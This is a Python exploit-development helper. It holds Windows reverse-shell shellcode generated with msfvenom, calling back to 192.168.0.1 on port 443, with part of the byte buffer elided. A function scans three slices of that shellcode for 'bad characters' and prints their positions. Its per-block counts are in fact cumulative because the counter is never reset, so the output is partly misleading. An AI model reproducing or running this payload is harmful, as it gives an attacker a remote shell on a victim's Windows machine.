#!/usr/bin/python

# msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.1 lport=443 -f python EXITFUNC=thread -v buf
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
......
buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68"
buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

# Declare the badchar array list
badchars = b"\x00\x0a\x11\x20\x28\x80\x81\x86"

def mapChars(shellcode, badchars):
	badchars = badchars
	count = 0

	# Divide the shellcode into three blocks of \x70 bytes of length
	first_block = shellcode[:112]

	second_block = shellcode[112:224]

	third_block = shellcode[224:324]

	# Search badchars inside the first block and printing it
	for i in range(len(first_block)):
		for char in badchars:
			if first_block[i] == char:
				print("Badchar found: " + str(hex(i)))
				print("Badchar: " + str(char))
				print("==============================")
				count += 1

	print("[!] First block: " + str(count) + " badchars! [!]")
	print("==============================")

	# Search badchars inside the second block and printing it
	for i in range(len(second_block)):
		for char in badchars:
			if second_block[i] == char:
				print("Badchar found: " + str(hex(i)))
				print("Badchar: " + str(char))
				print("==============================")
				count += 1
	print("[!] Second block: " + str(count) + " badchars! [!]")
	print("==============================")

	# Search badchars inside the third block and printing it
	for i in range(len(third_block)):
		for char in badchars:
			if third_block[i] == char:
				print("Badchar found: " + str(hex(i)))
				print("Badchar: " + str(char))
				print("==============================")
				count += 1
	print("[!] Third block: " + str(count) + " badchars! [!]")
	print("==============================")

# Call function mapChars
mapChars(buf, badchars)
